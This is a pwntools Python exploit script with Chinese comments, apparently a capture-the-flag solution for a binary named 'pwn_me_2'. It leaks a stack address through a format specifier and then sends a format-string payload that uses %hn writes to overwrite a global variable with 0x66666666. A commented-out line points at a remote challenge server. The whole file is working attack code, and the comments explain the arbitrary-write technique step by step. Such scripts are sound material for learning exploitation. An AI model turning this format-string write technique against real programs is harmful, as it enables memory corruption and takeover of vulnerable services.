#-*- coding: utf-8 -*-
from pwn import *
#context.log_level='debug'

#r = remote('139.129.76.65',50005)
r = process('./pwn_me_2')

#填充src，并获取src的地址
payload1 = b'a'*16 + b'%llx'
r.sendline(payload1)
r.recvuntil(b'preparing......\n')
# src 与 dword_2020E0 的偏移为 0x60
dword_2020E0_addr  = int(r.recv(12), 16) + 0x60

'''
备注：
  1. 写入的值 = 之前输出过的字节数的总和
  2. '%??c'表示输出??个空格
  3. '??$'表示第??个成员
  4. '$hn'表示写入的宽度为2个字节
  5. 一次性写入4字节宽度的话需要一次性输出0x66666666个字符，数量太多，会导致printf函数崩溃
'''
r.recvuntil(b'what do you want?\n')
#向dword_2020E0_addr写入0x6666
payload2  = b"%" + str(0x6666).encode()           + b"c%10$hn"	#13 byte
#向dword_2020E0_addr+2写入0x6666
payload2 += b"%" + str(0x16666 - 0x6666).encode() + b"c%11$hn"	#13 byte
#前面一共写入了26个字符，为了栈对齐，补6个'a'，到32个字符
payload2 += b'aaaaaa'
#前六个成员为rdi, rsi, rdx, rcx, r8, r9
#dword_2020E0_addr  为第10个成员（栈中第5个成员，下标为10）
payload2 += p64(dword_2020E0_addr)
#dword_2020E0_addr+2为第11个成员（栈中第6个成员，下标为11）
payload2 += p64(dword_2020E0_addr+2)

r.sendline(payload2)
r.interactive()
